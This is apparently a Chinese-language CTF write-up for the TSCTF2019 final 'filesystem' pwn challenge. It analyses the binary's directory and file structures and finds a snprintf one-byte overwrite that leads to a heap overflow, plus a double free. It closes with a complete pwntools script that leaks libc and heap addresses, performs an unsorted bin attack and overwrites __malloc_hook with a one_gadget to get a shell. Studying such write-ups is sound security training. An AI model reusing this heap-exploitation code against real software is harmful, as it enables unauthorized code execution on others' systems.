---
title: filesystem
categories:
- TSCTF2019
---
# TSCTF2019 Final fileSystem

## 前言 

填坑，当时做的时候卡在unsorted bin attack改掉限制

## 程序逻辑

决赛的题最深的感触就是题目的代码量比平时见到的多，自己读代码能力太弱，这道题还稍微好点，以后遇到这种链表什么的最好动态地去看，直观一点。

程序的功能是可以创建文件夹，在文件夹的下面可以创建文件，看代码+动态调可以复原出几个比较重要的结构体。

dir为文件夹结构体，其中前0x20字节存储文件夹名，另一个成员存储文件夹中包含文件的最后一个(比如文件夹中包含文件0123，这个指针为file3的文件指针)，在0x603050处用mmap分配了一块地址，所有的文件夹结构体都存储在这个结构体中

file_chunk为文件结构体，前0x20字节存储文件名，0x30处存储content_size，0x38处存储同一个文件夹下的它的前一个文件指针(0123的话3的prev_file_chunk为2)，content_chunk存储文件内容。每次创建文件固定分配0x48为file_chunk，用户指定size分配content_chunk

delete_node为删除的文件临时存储的结构，每次删除文件都会分配这样一个结构体，把结构体存放在0x603058所在的map_addr+0x280中，每次要恢复的时候从刚释放的文件找起，遍delete_note获取要恢复的文件

![struct](./1.jpg)

程序的功能如下：

![menu](./2.jpg)

最开始有一个Init_set函数来mmap一个地址存储后面的各种结构体，用这样一个随机的地址可以避免unlink

![init](./3.jpg)

CreateDir函数最多可以创建16个文件夹，初始化其中的成员为0

![createdir](./4.jpg)

CreateFile函数创建文件，限制每个文件大小不大于0x9f。在使用snprintf的时候，存在漏洞，即输入file_name长度+格式化字符串长度超过0x30时，snprintf返回0x31，从而可以写content_size一个字节，进而在写content_chunk的时候产生溢出。

![CraeteFile1](./5.jpg)

![CreateFile2](./6.jpg)

ShowFile函数输出content_chunk的内容

![ShowFile](./7.jpg)

DeleteFile删除文件，放入delete_node中，free并没有清空文件内容

![DeleteFile1](./8.jpg)

![DeleteFile2](./9.jpg)

RecoverFile恢复文件，将deleted_node的节点加回到链表尾部

![RecoverFile](./10.jpg)

## 漏洞利用

经过上述分析，有两个漏洞，一个snprintf可以造成堆溢出，对于一个节点，Delete再Recover之后可以再Delete，为double free(因为Recover并没有重新malloc，而是把释放过的节点又连接到了链表尾部)。

我们首先分配一个0x90的块，按照上述方法，free->recover->show可以泄露libc。同理free两个fast bin大小的块再recover再show可以泄露heap_base。

分配一个0x38一个0x48的块(从第一个Unsorted bin分配)，释放它们让他们进入fast bin，分配一个0x90的块再释放(这个块在第一个Unsorted bin的下方)，得到unsorted bin，再分配一个content_chunk大小为0x38的块，用掉刚才的fast bin，用snprintf的漏洞，可以让这个content_chunk覆写到Unsorted bin，修改其bk = 0x603068-0x10，再分配0x90的块就可以让0x603068写入main_arena+88，但是这里有个坑，就是每次都是要先分配0x58大小的堆作为file_chunk，这里就从Unsorted bin里分配，我们知道Unsorted bin攻击之后就只能用fast bin或者small bin进行分配了，因此这里会出错。解决方案就是提前分配一堆0x48的块，释放进0x50的fast bin，从此CreateFile都从它们中取，同理，我们double free需要的file_chunk也要从它们取，另外还要提前布置好0x70的fast bin的环境，突破限制之后直接一顿分配即可。最后分配0x10的块，使用Unsorted bin报错从而调用Malloc_hook得到shell。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    p = process('./filesystem')
    offset = 0x3c4b20
    #gdb.attach(p)
else:
    p = remote('172.16.20.2',9999)

def CreateDir(name):
    p.recvuntil('Your choice: \n')
    p.sendline('1')
    p.recvuntil('Give me the directory name: \n')
    p.sendline(name)

def CreateFileN(dir_name,file_name,file_size,content, is_changed='n'):
    p.recvuntil('Your choice: \n')
    p.sendline('2')
    p.recvuntil('which directory do you want to put this file in: \n')
    p.sendline(dir_name)
    p.recvuntil('Ok, plz input your filename(len<=0x20): \n')
    p.sendline(file_name)
    p.recvuntil('file size: \n')
    p.sendline(str(file_size))
    p.recvuntil('changed!!\n')
    p.sendline(is_changed)
    p.recvuntil('Content: \n')
    p.sendline(content)
def CreateFileY(dir_name,file_name,file_size,new_file_name,content, is_changed='Y'):
    p.recvuntil('Your choice: \n')
    p.sendline('2')
    p.recvuntil('which directory do you want to put this file in: \n')
    p.sendline(dir_name)
    p.recvuntil('Ok, plz input your filename(len<=0x20): \n')
    p.sendline(file_name)
    p.recvuntil('file size: \n')
    p.sendline(str(file_size))
    p.recvuntil('changed!!\n')
    p.sendline(is_changed)
    p.recvuntil('input your new file name: ')
    p.send(new_file_name)
    p.recvuntil('Content: \n')
    p.sendline(content)


def ShowFile(dir_name,file_name):
    p.recvuntil('Your choice: \n')
    p.sendline('3')
    p.recvuntil('input directory: \n')
    p.sendline(dir_name)
    p.recvuntil('input filename: \n')
    p.sendline(file_name)

def DeleteFile(dir_name,file_name):
    p.recvuntil('Your choice: \n')
    p.sendline('4')
    p.recvuntil('input directory: \n')
    p.sendline(dir_name)
    p.recvuntil('input filename: \n')
    p.sendline(file_name)

def RecoverFile(dir_name,file_name):
    p.recvuntil('Your choice: \n')
    p.sendline('6')
    p.recvuntil('input directory: \n')
    p.sendline(dir_name)
    p.recvuntil('input filename: \n')
    p.sendline(file_name)

def exp():

    #leak libc
    CreateDir('1')
    CreateFileN('1','a',0x88,'a')#0
    CreateFileN('1','c',0x88,'a'*0x17)#2
    DeleteFile('1','a')

    RecoverFile('1','a')

    ShowFile('1','a')

    p.recvuntil('file content: ')
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 88 - offset
    main_arena = libc_base + 88 + offset
    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
    shell_addr = libc_base + gadgets[1]
    log.success('libc base => ' + hex(libc_base))

    CreateFileN('1','e',0x38,'a')#4
    CreateFileN('1','f',0x48,'a')#5
    CreateFileN('1','g',0x68,'a'*0x47)#6
    CreateFileN('1','h',0x68,'a'*0x47)#7
    CreateFileN('1','i',0x48,'a'*0x47)#8
    CreateFileN('1','j',0x48,'a'*0x47)#9
    CreateFileN('1','k',0x20,'a'*0x47)#10
    for i in range(4):
        CreateFileN('1',str(i+5),0x48,'a')
    DeleteFile('1','g')
    DeleteFile('1','h')
    RecoverFile('1','g')
    ShowFile('1','g')


    #leak heap
    p.recvuntil('file content: ')
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x2d0
    log.success("heap base => " + hex(heap_base))



    #malloc preapare

    #double free
    DeleteFile('1','i')
    DeleteFile('1','j')
    #RecoverFile('1','i')
    #DeleteFile('1','i')
    #set fast bins to malloc
    DeleteFile('1','e')
    DeleteFile('1','f')


    DeleteFile('1','c')


    #unsorted bin attack
    #payload = p64(0)+p64(main_arena)+'a'*0x28+p64(0x51)+p64(0x63)+'\x00'*0x28+p64(0x88)+p64(heap_base+0x1f0)
    #payload += p64(heap_base+0x160)+p64(0x91)+p64(0xdeadbeef)+p64(0x603058)
    CreateFileY('1','a'*0x1f,0x38,'a'*0x30+'\xf0','a'*0x80+p64(0)+p64(0x91)+p64(0)+p64(0x603058))


    CreateFileN('1','j',0x80,'a')#10

    for i in range(4):
        DeleteFile('1',str(i+5))

    DeleteFile('1','g')

    CreateFileN('1','wz',0x68,p64(fake_chunk))


    CreateFileN('1','wz1',0x68,'xmzyshypnc')


    CreateFileN('1','wz2',0x68,'xmzyshypnc')
    CreateFileN('1','ama2in9',0x68,'a'*0x13+p64(shell_addr))
    gdb.attach(p)


    #get shell

    p.recvuntil('Your choice: \n')
    p.sendline('2')
    p.recvuntil('which directory do you want to put this file in: \n')
    p.sendline('1')

    p.interactive()
exp()

```

## 收获

看代码，做题专注，不要太着急，慢慢调试慢慢理清思路，注意总结以前的思路。(感谢姚老板赛后给我的wp，获益匪浅)
